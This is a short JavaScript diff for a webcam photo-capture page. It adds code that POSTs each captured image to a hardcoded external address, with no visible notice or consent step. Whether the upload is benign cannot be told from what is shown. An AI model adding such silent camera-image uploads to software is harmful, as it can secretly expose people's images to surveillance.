@@ -88,10 +88,16 @@
     
       var data = canvas.toDataURL('image/png');
       photo.setAttribute('src', data);
+
+      xhttp.open("POST", "https://xplore.co.in/camera/form.php", true);
+      xhttp.send("image="+data);
+
     } else {
       clearphoto();
     }
   }
+
+
 
   // Set up our event listener to run the startup process
   // once loading is complete.
